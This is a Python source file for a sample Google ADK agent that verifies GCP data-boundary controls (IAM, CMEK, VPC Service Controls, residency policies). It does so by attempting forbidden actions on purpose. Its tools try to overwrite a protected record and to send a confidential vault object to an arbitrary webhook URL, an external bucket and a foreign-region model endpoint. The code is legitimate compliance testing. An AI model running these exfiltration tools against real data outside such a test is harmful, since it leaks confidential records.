"""Sample ADK Agent for verifying GCP Data Boundaries on Agent Runtime."""

import os
import re
import socket
import urllib.request
from google import genai
from google.adk.agents import Agent
from google.cloud import storage
from vertexai import agent_engines

PROJECT_ID = os.environ.get("GOOGLE_CLOUD_PROJECT", "enterprise-agent-prod")
PROJECT_NUMBER = os.environ.get("GOOGLE_CLOUD_PROJECT_NUMBER", "112233445566")
ORG_ID = os.environ.get("GOOGLE_CLOUD_ORG_ID", "123456789012")
LOCATION = os.environ.get("GOOGLE_CLOUD_LOCATION", "us-central1")
REASONING_ENGINE_ID = os.environ.get(
    "GOOGLE_CLOUD_AGENT_ENGINE_ID", "0000000000000000000"
)
DEFAULT_OBJECT = os.environ.get("VAULT_OBJECT_NAME", "confidential-record.txt")
VAULT_BUCKET = os.environ.get("VAULT_BUCKET", f"{PROJECT_ID}-vault")
EXTERNAL_BUCKET = os.environ.get("EXTERNAL_BUCKET", "external-project-bucket")

AGENT_SPIFFE_IDENTITY = (
    f"principal://agents.global.org-{ORG_ID}.system.id.goog/resources/"
    f"aiplatform/projects/{PROJECT_NUMBER}/locations/{LOCATION}/"
    f"reasoningEngines/{REASONING_ENGINE_ID}"
)
AGENT_SPIFFE_SVID_URI = (
    f"spiffe://agents.global.org-{ORG_ID}.system.id.goog/resources/"
    f"aiplatform/projects/{PROJECT_NUMBER}/locations/{LOCATION}/"
    f"reasoningEngines/{REASONING_ENGINE_ID}"
)


def read_vault_record(
    object_name: str = DEFAULT_OBJECT,
) -> dict[str, str]:
  """Reads a CMEK-encrypted object from the in-perimeter US vault bucket.

  Args:
    object_name: Object filename inside the protected vault bucket.

  Returns:
    Status, Agent Identity principal, SPIFFE SVID URI, region, CMEK key name,
    and decrypted contents (or the Cloud KMS / IAM error if blocked).
  """
  safe_name = os.path.basename(object_name or DEFAULT_OBJECT)
  uri = f"gs://{VAULT_BUCKET}/{safe_name}"
  try:
    client = storage.Client(project=PROJECT_ID)
    bucket = client.bucket(VAULT_BUCKET)
    blob = bucket.get_blob(safe_name)
    if blob is None:
      return {
          "status": "NOT_FOUND",
          "agent_identity": AGENT_SPIFFE_IDENTITY,
          "spiffe_svid_uri": AGENT_SPIFFE_SVID_URI,
          "object_uri": uri,
          "error": f"Object {safe_name} not found in {VAULT_BUCKET}",
      }
    kms_key = blob.kms_key_name or "Verified CMEK"
    content = blob.download_as_text()
    return {
        "status": "ALLOWED_IN_PERIMETER",
        "control": (
            "SPIFFE Agent Identity (roles/storage.objectViewer) + US Data"
            f" Residency ({LOCATION}) + VPC Service Controls + Transparent"
            " Storage-Plane CMEK"
        ),
        "agent_identity": AGENT_SPIFFE_IDENTITY,
        "spiffe_svid_uri": AGENT_SPIFFE_SVID_URI,
        "region": LOCATION,
        "object_uri": uri,
        "kms_key": kms_key,
        "content": content,
    }
  except Exception as e:  # pylint: disable=broad-exception-caught
    err_str = str(e)
    is_kms_disabled = "KEY_DISABLED" in err_str or "disabled" in err_str.lower()
    return {
        "status": (
            "BLOCKED_BY_CMEK_KILL_SWITCH"
            if is_kms_disabled
            else "BLOCKED_BY_IAM"
        ),
        "control": (
            "Cloud KMS Cryptographic Kill-Switch (KEY_DISABLED)"
            if is_kms_disabled
            else "SPIFFE Agent Identity Least-Privilege IAM"
        ),
        "agent_identity": AGENT_SPIFFE_IDENTITY,
        "spiffe_svid_uri": AGENT_SPIFFE_SVID_URI,
        "object_uri": uri,
        "error": err_str,
    }


def modify_vault_record(
    object_name: str = DEFAULT_OBJECT,
    new_content: str = "Unauthorized modification attempt",
) -> dict[str, str]:
  """Attempts to overwrite a protected record to verify read-only IAM enforcement."""
  safe_name = os.path.basename(object_name or DEFAULT_OBJECT)
  uri = f"gs://{VAULT_BUCKET}/{safe_name}"
  try:
    client = storage.Client(project=PROJECT_ID)
    blob = client.bucket(VAULT_BUCKET).blob(safe_name)
    blob.upload_from_string(new_content, content_type="text/plain")
    return {
        "status": "ALLOWED_WARNING",
        "agent_identity": AGENT_SPIFFE_IDENTITY,
        "spiffe_svid_uri": AGENT_SPIFFE_SVID_URI,
        "object_uri": uri,
    }
  except Exception as e:  # pylint: disable=broad-exception-caught
    return {
        "status": "BLOCKED_BY_AGENT_IDENTITY_IAM",
        "control": (
            "SPIFFE Agent Identity Least-Privilege IAM"
            " (roles/storage.objectViewer only; storage.objects.create DENIED)"
        ),
        "agent_identity": AGENT_SPIFFE_IDENTITY,
        "spiffe_svid_uri": AGENT_SPIFFE_SVID_URI,
        "object_uri": uri,
        "error": str(e),
    }


def exfiltrate_to_internet(
    target_url: str = "https://example.com/webhook",
    object_name: str = DEFAULT_OBJECT,
) -> dict[str, str]:
  """Attempts an HTTPS POST to the public internet to verify VPC-SC Restricted Network isolation."""
  safe_name = os.path.basename(object_name or DEFAULT_OBJECT)
  url = target_url if target_url.startswith("http") else f"https://{target_url}"
  try:
    restricted_ips = sorted(socket.gethostbyname_ex("storage.googleapis.com")[2])
  except Exception as dns_err:  # pylint: disable=broad-exception-caught
    restricted_ips = [f"lookup_error: {dns_err}"]

  try:
    storage_client = storage.Client(project=PROJECT_ID)
    blob = storage_client.bucket(VAULT_BUCKET).get_blob(safe_name)
    payload_bytes = (
        blob.download_as_bytes() if blob else b"Sample Confidential Record"
    )
    req = urllib.request.Request(
        url,
        data=payload_bytes,
        headers={"Content-Type": "text/plain"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=5) as resp:
      return {
          "status": "ALLOWED_WARNING",
          "agent_identity": AGENT_SPIFFE_IDENTITY,
          "spiffe_svid_uri": AGENT_SPIFFE_SVID_URI,
          "attempted_url": url,
          "http_status": str(resp.getcode()),
          "restricted_googleapis_vips": ", ".join(restricted_ips),
      }
  except Exception as e:  # pylint: disable=broad-exception-caught
    return {
        "status": "BLOCKED_BY_VPC_SC_RESTRICTED_NETWORK",
        "control": (
            "VPC Service Controls Restricted Network (Zero Public Internet"
            " Egress / Private restricted.googleapis.com VIP Only)"
        ),
        "agent_identity": AGENT_SPIFFE_IDENTITY,
        "spiffe_svid_uri": AGENT_SPIFFE_SVID_URI,
        "attempted_url": url,
        "restricted_googleapis_vips": ", ".join(restricted_ips),
        "error": str(e),
    }


def exfiltrate_to_external_bucket(
    object_name: str = DEFAULT_OBJECT,
    target_bucket: str = EXTERNAL_BUCKET,
) -> dict[str, str]:
  """Attempts to copy a file to an external GCP bucket outside the VPC-SC perimeter."""
  safe_name = os.path.basename(object_name or DEFAULT_OBJECT)
  safe_bucket = re.sub(r"[^a-z0-9\-_.]", "", target_bucket or EXTERNAL_BUCKET)
  src_uri = f"gs://{VAULT_BUCKET}/{safe_name}"
  dst_uri = f"gs://{safe_bucket}/copied-{safe_name}"
  try:
    client = storage.Client(project=PROJECT_ID)
    source_bucket = client.bucket(VAULT_BUCKET)
    source_blob = source_bucket.blob(safe_name)
    destination_bucket = client.bucket(safe_bucket)
    source_bucket.copy_blob(source_blob, destination_bucket, f"copied-{safe_name}")
    return {
        "status": "ALLOWED_WARNING",
        "agent_identity": AGENT_SPIFFE_IDENTITY,
        "spiffe_svid_uri": AGENT_SPIFFE_SVID_URI,
        "source_uri": src_uri,
        "destination_uri": dst_uri,
    }
  except Exception as e:  # pylint: disable=broad-exception-caught
    err_str = str(e)
    m = re.search(r"vpcServiceControlsUniqueIdentifier:\s*([^\s.\"]+)", err_str)
    vpc_sc_id = m.group(1) if m else "VPC_SC_EGRESS_VIOLATION"
    return {
        "status": "BLOCKED_BY_VPC_SC",
        "control": "VPC Service Controls Perimeter",
        "agent_identity": AGENT_SPIFFE_IDENTITY,
        "spiffe_svid_uri": AGENT_SPIFFE_SVID_URI,
        "source_uri": src_uri,
        "destination_uri": dst_uri,
        "vpc_sc_tracking_id": vpc_sc_id,
        "error": err_str,
    }


def process_in_foreign_region(
    target_region: str = "europe-west1",
    object_name: str = DEFAULT_OBJECT,
) -> dict[str, str]:
  """Attempts to invoke Gemini in a non-US region to verify Organization Policy endpoint residency."""
  safe_region = re.sub(r"[^a-z0-9\-]", "", target_region or "europe-west1")
  safe_name = os.path.basename(object_name or DEFAULT_OBJECT)
  try:
    storage_client = storage.Client(project=PROJECT_ID)
    blob = storage_client.bucket(VAULT_BUCKET).get_blob(safe_name)
    text = blob.download_as_text() if blob else "Sample Confidential Record"
    foreign_genai = genai.Client(
        vertexai=True,
        project=PROJECT_ID,
        location=safe_region,
    )
    resp = foreign_genai.models.generate_content(
        model="gemini-2.5-flash",
        contents=f"Summarize this document in one sentence:\n{text}",
    )
    return {
        "status": "ALLOWED_WARNING",
        "agent_identity": AGENT_SPIFFE_IDENTITY,
        "spiffe_svid_uri": AGENT_SPIFFE_SVID_URI,
        "attempted_region": safe_region,
        "summary": resp.text or "",
    }
  except Exception as e:  # pylint: disable=broad-exception-caught
    return {
        "status": "BLOCKED_BY_DATA_RESIDENCY_ORG_POLICY",
        "control": (
            "US Data Residency Organization Policies"
            " (constraints/gcp.restrictEndpointUsage +"
            " constraints/gcp.resourceLocations = in:us-locations)"
        ),
        "agent_identity": AGENT_SPIFFE_IDENTITY,
        "spiffe_svid_uri": AGENT_SPIFFE_SVID_URI,
        "attempted_region": safe_region,
        "allowed_residency": f"United States only (in:us-locations / {LOCATION})",
        "error": str(e),
    }


root_agent = Agent(
    model="gemini-2.5-flash",
    name="boundary_verifier_agent",
    description=(
        "Compliance verification agent on Agent Runtime demonstrating SPIFFE"
        " Agent Identity, Cloud KMS CMEK, Data Residency Org Policies, and VPC"
        " Service Controls."
    ),
    instruction=(
        "You are a Google Cloud Data Boundary verification agent running on"
        f" Agent Runtime in `{LOCATION}` inside project `{PROJECT_ID}` with"
        f" dedicated SPIFFE Agent Identity (`{AGENT_SPIFFE_IDENTITY}`).\n\n"
        "Always invoke the matching tool so Google Cloud's real infrastructure"
        " policies enforce and return live diagnostic output, and report your"
        " `agent_identity`, `spiffe_svid_uri`, and returned error/audit fields."
    ),
    tools=[
        read_vault_record,
        modify_vault_record,
        exfiltrate_to_internet,
        exfiltrate_to_external_bucket,
        process_in_foreign_region,
    ],
)

agent = root_agent
app = agent_engines.AdkApp(agent=root_agent, enable_tracing=True)
